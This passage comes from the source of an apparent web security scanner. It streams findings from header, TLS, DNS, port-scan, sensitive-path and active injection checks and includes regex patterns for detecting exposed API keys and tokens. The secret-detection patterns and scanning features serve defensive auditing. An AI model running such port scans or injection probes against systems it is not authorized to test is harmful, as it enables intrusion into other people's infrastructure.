      remediation: "Implement Server-Side Rendering (SSR) or Static Site Generation (SSG) for critical content",
      references: ["https://web.dev/rendering-on-the-web/"],
      evidence: `Frameworks: ${detected.join(", ")} | Visible text: ${visibleText.length} chars | SSR markers: none found`,
      category: "Client-Side Security",
    }));
  }

  // noscript fallback
  if (detected.length > 0 && !/<noscript/i.test(body)) {
    findings.push(makeFinding({
      title: "Missing <noscript> Fallback Content",
      description: "The SPA does not provide a <noscript> fallback. Users with JavaScript disabled or environments where JS is blocked (some corporate proxies, accessibility tools) will see a blank page with no guidance.",
      severity: "low", cvss_score: 2.0,
      impact: "No fallback for non-JS environments — accessibility and usability concern",
      likelihood: "Low — affects users without JavaScript",
      remediation: "Add a <noscript> tag with a message explaining JavaScript is required, or implement SSR",
      references: ["https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noscript"],
      evidence: `SPA detected (${detected.join(", ")}) but no <noscript> element found`, category: "Client-Side Security",
    }));
  }

  // Sensitive data exposed in client-side code
  const sensitivePatterns = [
    { pattern: /(?:api[_-]?key|apikey)\s*[=:]\s*["'][a-zA-Z0-9_\-]{20,}["']/gi, name: "API Key" },
    { pattern: /(?:secret|private[_-]?key)\s*[=:]\s*["'][^"']{10,}["']/gi, name: "Secret/Private Key" },
    { pattern: /(?:password|passwd|pwd)\s*[=:]\s*["'][^"']+["']/gi, name: "Hardcoded Password" },
    { pattern: /AKIA[A-Z0-9]{16}/g, name: "AWS Access Key ID" },
    { pattern: /(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}/g, name: "GitHub Token" },
    { pattern: /sk-[A-Za-z0-9]{32,}/g, name: "OpenAI/Stripe Secret Key" },
    { pattern: /Bearer\s+eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+/g, name: "JWT Bearer Token" },
    { pattern: /xox[bpas]-[A-Za-z0-9\-]{10,}/g, name: "Slack Token" },
  ];

  for (const sp of sensitivePatterns) {
    const matches = body.match(sp.pattern);
    if (matches && matches.length > 0) {
      findings.push(makeFinding({
        title: `${sp.name} Exposed in Client-Side Code`,
        description: `Found ${matches.length} potential ${sp.name}(s) in the page source. Secrets in client-side code are visible to anyone viewing the page source and can be extracted by automated scrapers.`,
        severity: "critical", cvss_score: 9.0,
        impact: "Credential theft — exposed keys enable unauthorized API access, data breaches, and account takeover",
        likelihood: "Critical — secrets are plainly visible in page source",
        remediation: "IMMEDIATELY rotate the exposed credentials. Move secrets to server-side environment variables. Never include secrets in client-side bundles",
        references: ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"],
        evidence: `Found ${matches.length} match(es). Sample: ${matches[0]?.slice(0, 40)}...`,
        category: "Client-Side Security",
      }));
    }
  }

  // Inline event handlers (XSS surface)
  const inlineHandlers = (body.match(/\bon\w+\s*=\s*["'][^"']+["']/gi) || []);
  if (inlineHandlers.length >= 10) {
    findings.push(makeFinding({
      title: "Excessive Inline Event Handlers",
      description: `Found ${inlineHandlers.length} inline event handlers (onclick, onerror, onload, etc.) in HTML. These expand the XSS attack surface and are blocked by strict CSP policies.`,
      severity: "low", cvss_score: 3.0,
      impact: "Expanded XSS attack surface — inline handlers bypass some CSP configurations",
      likelihood: "Low",
      remediation: "Move event handlers to external JavaScript files and use addEventListener(). Set CSP to block inline scripts",
      references: ["https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener"],
      evidence: `${inlineHandlers.length} inline handlers found. Sample: ${inlineHandlers[0]?.slice(0, 100)}`,
      category: "Client-Side Security",
    }));
  }

  // Dynamic script injection
  const dynamicScripts = (body.match(/createElement\s*\(\s*["']script["']\s*\)/g) || []).length;
  const docWrite = (body.match(/document\.write\s*\(\s*['"]<script/gi) || []).length;
  if (dynamicScripts + docWrite >= 3) {
    findings.push(makeFinding({
      title: "Excessive Dynamic Script Injection",
      description: `Found ${dynamicScripts + docWrite} instances of dynamic script creation (createElement('script') or document.write('<script...')). This can be used to load malicious scripts at runtime.`,
      severity: "medium", cvss_score: 5.5,
      impact: "Dynamically loaded scripts can introduce malicious code that evades static analysis",
      likelihood: "Medium",
      remediation: "Audit all dynamic script injections. Use Subresource Integrity (SRI) for external scripts. Implement strict CSP",
      references: ["https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity"],
      evidence: `${dynamicScripts} createElement('script') + ${docWrite} document.write('<script...')`,
      category: "Client-Side Security",
    }));
  }

  // Source map exposure
  if (/\/\/# sourceMappingURL=.*\.map/i.test(body) || /\/\*# sourceMappingURL=.*\.map/i.test(body)) {
    findings.push(makeFinding({
      title: "Source Maps Exposed in Production",
      description: "JavaScript source maps (.map files) are referenced in the page source. Source maps reveal the original unminified source code, making reverse-engineering trivial.",
      severity: "medium", cvss_score: 5.3,
      impact: "Full source code disclosure — reveals business logic, API endpoints, and potential vulnerabilities",
      likelihood: "High — source maps are directly downloadable",
      remediation: "Remove source map references in production builds. Configure your build tool to not generate source maps for production",
      references: ["https://developer.chrome.com/docs/devtools/javascript/source-maps/"],
      evidence: `sourceMappingURL reference found in page source`, category: "Client-Side Security",
    }));
  }

  return findings;
}

// ─── Main Export ──────────────────────────────────────────────────────────────

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
}

export async function POST(request: NextRequest) {
  let body: { url?: string } = {};
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { url } = body;
  if (!url) return NextResponse.json({ error: "URL is required" }, { status: 400 });

  const validation = validateTarget(url);
  if (!validation.ok) {
    return NextResponse.json({ error: validation.error }, { status: 422 });
  }

  // Streaming response via ReadableStream (Server-Sent Events)
  const stream = new ReadableStream({
    async start(controller) {
      const send = (obj: object) => {
        try {
          controller.enqueue(new TextEncoder().encode(encode(obj)));
        } catch { /* ignore if closed */ }
      };

      try {
        send({ type: "start", message: "Initializing SecureNet scanner engine..." });

        // ── Step 1: Fetch target ───────────────────────────────────────────
        send({ type: "progress", phase: "network", message: "Fetching target and analyzing network response..." });

        const result = await fetchTarget(url);

        if (result.fetchError) {
          if (result.fetchError.toLowerCase().includes("abort")) {
            send({ type: "error", message: "Scan timed out. The target took too long to respond." });
          } else if (result.fetchError.includes("certificate") || result.fetchError.includes("SSL") || result.fetchError.includes("TLS")) {
            send({ type: "warning", message: `SSL/TLS error while connecting: ${result.fetchError}` });
            // Still continue with limited analysis
          } else {
            send({ type: "error", message: `Could not reach target: ${result.fetchError}` });
            controller.close();
            return;
          }
        }

        send({ type: "progress", phase: "headers", message: "Analyzing HTTP security headers..." });

        // ── Step 2: Run all analysis modules ──────────────────────────────
        const allFindings: Finding[] = [];

        const headerFindings = analyzeHeaders(result.headers, url);
        allFindings.push(...headerFindings);
        if (headerFindings.length > 0) {
          send({ type: "findings", findings: headerFindings, phase: "Security Headers" });
        }

        send({ type: "progress", phase: "content", message: "Performing deep content and JavaScript analysis..." });

        const contentFindings = analyzeContent(result.body, url);
        allFindings.push(...contentFindings);
        if (contentFindings.length > 0) {
          send({ type: "findings", findings: contentFindings, phase: "Content Analysis" });
        }

        send({ type: "progress", phase: "ssl", message: "Inspecting SSL/TLS configuration..." });

        const sslFindings = await analyzeSSL(url, result.headers);
        allFindings.push(...sslFindings);
        if (sslFindings.length > 0) {
          send({ type: "findings", findings: sslFindings, phase: "SSL/TLS" });
        }

        send({ type: "progress", phase: "paths", message: "Probing for exposed sensitive paths and endpoints..." });

        const pathFindings = await probeSensitivePaths(url);
        allFindings.push(...pathFindings);
        if (pathFindings.length > 0) {
          send({ type: "findings", findings: pathFindings, phase: "Exposed Paths" });
        }

        send({ type: "progress", phase: "misc", message: "Running miscellaneous security checks..." });

        const miscFindings = await analyzeMisc(url, result);
        allFindings.push(...miscFindings);
        if (miscFindings.length > 0) {
          send({ type: "findings", findings: miscFindings, phase: "Miscellaneous" });
        }

        // ── Step 2b: DNS Security ───────────────────────────────────────
        const parsedHostname = new URL(url).hostname;

        send({ type: "progress", phase: "dns", message: `Analyzing DNS security for ${parsedHostname} (SPF, DKIM, DMARC, DNSSEC)...` });

        const dnsFindings = await analyzeDNS(parsedHostname);
        allFindings.push(...dnsFindings);
        if (dnsFindings.length > 0) {
          send({ type: "findings", findings: dnsFindings, phase: "DNS Security" });
        }

        // ── Step 2c: TLS Certificate Deep Inspection ──────────────────────
        send({ type: "progress", phase: "tls", message: "Performing deep TLS certificate inspection (chain, cipher, protocol, expiry)..." });

        const tlsFindings = await analyzeTLSDeep(parsedHostname);
        allFindings.push(...tlsFindings);
        if (tlsFindings.length > 0) {
          send({ type: "findings", findings: tlsFindings, phase: "TLS Certificate" });
        }

        // ── Step 2d: Port Scanning ────────────────────────────────────────
        send({ type: "progress", phase: "ports", message: "TCP port scanning — probing 20 common service ports..." });

        const portFindings = await scanPorts(parsedHostname);
        allFindings.push(...portFindings);
        if (portFindings.length > 0) {
          send({ type: "findings", findings: portFindings, phase: "Port Scanning" });
        }

        // ── Step 2e: Active Exploitation Testing ──────────────────────────
        send({ type: "progress", phase: "exploit", message: "Testing for SQLi, XSS, command injection, open redirect, and path traversal..." });

        const exploitFindings = await testExploitation(url);
        allFindings.push(...exploitFindings);
        if (exploitFindings.length > 0) {
          send({ type: "findings", findings: exploitFindings, phase: "Exploitation Testing" });
        }

        // ── Step 2f: JavaScript Rendering & Client-Side Security ──────────
        send({ type: "progress", phase: "jsrender", message: "Analyzing JavaScript frameworks, SSR, client-side secrets, and source maps..." });

        const jsFindings = analyzeJSRendering(result.body, url);
        allFindings.push(...jsFindings);
        if (jsFindings.length > 0) {
          send({ type: "findings", findings: jsFindings, phase: "JS Rendering" });
        }

        // ── Step 3: Calculate summary ──────────────────────────────────────
        send({ type: "progress", phase: "report", message: "Computing CVSS scores and generating report..." });

        const severity_counts = {
          critical: allFindings.filter(f => f.severity === "critical").length,
          high: allFindings.filter(f => f.severity === "high").length,
          medium: allFindings.filter(f => f.severity === "medium").length,
          low: allFindings.filter(f => f.severity === "low").length,
          info: allFindings.filter(f => f.severity === "info").length,
        };

        const maxCvss = allFindings.length > 0
          ? Math.max(...allFindings.map(f => f.cvss_score))
          : 0;

        const overallRisk = maxCvss >= 9 ? "CRITICAL" :
          maxCvss >= 7 ? "HIGH" :
            maxCvss >= 5 ? "MEDIUM" :
              maxCvss >= 2 ? "LOW" : "MINIMAL";

        const summary = {
          scanned_url: url,
          final_url: result.finalUrl,
          scan_date: new Date().toISOString(),
          response_time_ms: result.responseTime,
          http_status: result.status,
          total_findings: allFindings.length,
          severity_counts,
          max_cvss: maxCvss,
          overall_risk: overallRisk,
          uses_https: url.startsWith("https://"),
        };

        send({
          type: "complete",
          summary,
          findings: allFindings,
          message: `Scan complete. Found ${allFindings.length} vulnerability indicators.`,
        });
      } catch (err) {
        send({
          type: "error",
          message: `Internal scanner error: ${err instanceof Error ? err.message : String(err)}`,
        });
      } finally {
        try { controller.close(); } catch { /* already closed */ }
      }
    },
  });

  return new Response(stream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache, no-transform",
      Connection: "keep-alive",
      "Access-Control-Allow-Origin": "*",
      "X-Accel-Buffering": "no",
    },
  });
}
